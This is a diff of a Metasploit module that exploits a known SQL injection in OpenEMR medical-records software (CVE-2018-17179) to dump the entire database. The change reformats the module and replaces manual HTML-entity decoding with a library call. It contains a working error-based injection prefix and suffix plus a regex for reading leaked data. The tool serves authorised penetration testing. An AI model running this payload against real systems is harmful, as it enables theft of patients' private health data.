@@ -11,29 +11,32 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::SQLi
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'OpenEMR 5.0.1 Patch 6 SQLi Dump',
-      'Description' => '
-        This module exploits a SQLi vulnerability found in
-        OpenEMR version 5.0.1 Patch 6 and lower. The
-        vulnerability allows the contents of the entire
-        database (with exception of log and task tables) to be
-        extracted.
-        This module saves each table as a `.csv` file in your
-        loot directory and has been tested with
-        OpenEMR 5.0.1 (3).
-      ',
-      'License' => MSF_LICENSE,
-      'Author' =>
-        [
-          'Will Porter <will.porter[at]lodestonesecurity.com>'
+    super(
+      update_info(
+        info,
+        'Name' => 'OpenEMR 5.0.1 Patch 6 SQLi Dump',
+        'Description' => %q{
+          This module exploits a SQLi vulnerability found in
+          OpenEMR version 5.0.1 Patch 6 and lower. The
+          vulnerability allows the contents of the entire
+          database (with exception of log and task tables) to be
+          extracted.
+          This module saves each table as a `.csv` file in your
+          loot directory and has been tested with
+          OpenEMR 5.0.1 (3).
+        },
+        'License' => MSF_LICENSE,
+        'Author' =>
+          [
+            'Will Porter <will.porter[at]lodestonesecurity.com>'
+          ],
+        'References' => [
+          ['CVE', '2018-17179'],
+          ['URL', 'https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617']
         ],
-      'References' => [
-        ['CVE', '2018-17179'],
-        ['URL', 'https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617']
-      ],
-      'DisclosureDate' => 'May 17 2019'
-    ))
+        'DisclosureDate' => 'May 17 2019'
+      )
+    )
 
     register_options(
       [
@@ -105,14 +108,16 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def dump_all
-    sqli_opts = { prefix: "1' and updatexml(1,concat(0x7e, (",
-                  suffix: ")),0) or '",
-                  truncation_length: 31 }
-    html_entities = { '&nbsp;' => ' ', '&lt;' => '<', '&gt;' => '>', '&amp;' => '&', '&quot;' => '"', '&apos;' => "'", '&cent;' => '¢', '&pound;' => '£', '&yen;' => '¥', '&euro;' => '€', '&copy;' => '©', '&reg;' => '®' }
+    sqli_opts = {
+      prefix: "1' and updatexml(1,concat(0x7e, (",
+      suffix: ")),0) or '",
+      truncation_length: 31
+    }
     sqli = MySQLi.new(sqli_opts) do |payload|
       res = send_sqli_request(payload)
       if res && (response = res.body[%r{XPATH syntax error: '~(.*?)'</font>}, 1])
-        response.gsub(/&[a-z]{1,5};/, html_entities)
+        # results can include html entities, decoding is necessary to keep length <=31
+        Rex::Text.html_decode(response)
       else
         ''
       end
